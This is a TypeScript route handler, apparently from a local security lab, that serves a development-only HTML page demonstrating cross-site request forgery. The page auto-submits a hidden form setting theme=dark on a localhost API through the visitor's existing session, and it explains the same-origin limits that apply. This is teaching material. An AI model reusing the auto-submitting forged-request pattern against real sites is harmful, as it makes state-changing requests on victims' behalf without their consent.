export function GET() {
  if (process.env.NODE_ENV !== "development") return new Response("Not found", { status: 404 });
  return new Response(`<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Local CSRF theme demo</title></head>
<body>
  <h1>LOCAL LAB ONLY — CSRF theme preference</h1>
  <p>This page automatically submits a plain HTML form to the local API using the browser's existing lab session. It only requests theme=dark.</p>
  <p>Sign in at http://localhost:3000 first. Check the saved theme there after visiting this page.</p>
  <form id="theme-form" action="http://localhost:4000/profile/theme" method="post" enctype="application/x-www-form-urlencoded" target="theme-response">
    <input type="hidden" name="theme" value="dark">
    <button type="submit">Submit theme form again</button>
  </form>
  <p id="status" role="status">Preparing form.</p>
  <iframe id="theme-response" name="theme-response" title="Cross-origin theme response" hidden></iframe>
  <p>A submitted request is not proof of a preference change. Secure mode rejects it; compare server logs, DevTools Network, and GET /profile/theme from the trusted page.</p>
  <a href="http://localhost:3000">Return to trusted lab</a>
  <script>
    const form = document.getElementById('theme-form');
    const frame = document.getElementById('theme-response');
    const status = document.getElementById('status');
    frame.addEventListener('load', () => {
      try {
        // A same-origin-policy probe only; never inspect body contents or credentials.
        void frame.contentWindow.location.origin;
      } catch (error) {
        status.textContent = 'Response frame loaded; attacker JavaScript cannot read it (' + error.name + '). Check the trusted page for the saved theme.';
      }
    });
    form.addEventListener('submit', () => {
      status.textContent = 'Form submitted. Inspect the local API logs and Network panel.';
    });
    form.requestSubmit();
  </script>
</body></html>`, { headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" } });
}
